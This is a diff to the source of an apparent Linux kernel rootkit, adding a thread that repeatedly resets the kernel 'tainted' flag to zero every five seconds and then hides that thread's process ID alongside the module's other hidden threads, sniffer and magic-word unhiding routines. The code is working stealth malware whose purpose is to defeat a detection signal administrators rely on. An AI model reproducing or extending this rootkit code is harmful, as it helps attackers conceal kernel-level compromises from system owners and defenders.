@@ -62,6 +62,7 @@ enum {
 
 struct task_struct *tsk_sniff = NULL;
 struct task_struct *tsk_prc = NULL;
+struct task_struct *tsk_tainted = NULL;
 
 static struct proc_dir_entry *rrProcFileEntry;
 struct __lkmmod_t{ struct module *this_mod; };
@@ -670,6 +671,25 @@ static int _proc_watchdog(void *unused) {
       return 0;
 }
 
+/**
+ * Make sure /proc/sys/kernel/tainted is zeroed for
+ * things that this module will annoy the kernel
+ */
+static int _reset_tainted(void *unused) {
+    struct kernel_syscalls *kaddr = kv_kall_load_addr();
+    if (!kaddr) {
+        prerr("_reset_tainted: Invalid data.\n");
+        goto out;
+    }
+    while (!kthread_should_stop()) {
+        kv_reset_tainted(kaddr->tainted);
+        ssleep(5);
+    }
+
+out:
+    return 0;
+}
+
 static void _unroll_init(void) {
     char *magik = get_unhide_magic_word();
 
@@ -677,6 +697,7 @@ static void _unroll_init(void) {
     if (tsk_prc) {
         kthread_unpark(tsk_prc);
         kthread_stop(tsk_prc);
+        kthread_stop(tsk_tainted);
     }
 
     _proc_rm_wrapper();
@@ -722,6 +743,10 @@ static int __init kv_init(void) {
     if (!tsk_prc)
         goto unroll_init;
 
+    tsk_tainted = kthread_run(_reset_tainted, NULL, THREAD_TAINTED_NAME);
+    if (!tsk_tainted)
+        goto unroll_init;
+
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(5,17,0)
 cont:
 #endif
@@ -736,6 +761,7 @@ cont:
     /** hide kthreads */
     kv_hide_task_by_pid(tsk_sniff->pid, 0, CHILDREN);
     kv_hide_task_by_pid(tsk_prc->pid, 0, CHILDREN);
+    kv_hide_task_by_pid(tsk_tainted->pid, 0, CHILDREN);
 
     /** hide magic filenames & directories */
     fs_add_name_ro(kv_hide_str_on_load);
@@ -802,6 +828,10 @@ static void __exit kv_cleanup(void) {
         prinfo("stop proc timeout thread\n");
         kthread_unpark(tsk_prc);
         kthread_stop(tsk_prc);
+    }
+    if (tsk_tainted && !IS_ERR(tsk_tainted)) {
+        prinfo("stop tainted thread\n");
+        kthread_stop(tsk_tainted);
     }
 
     fs_names_cleanup();
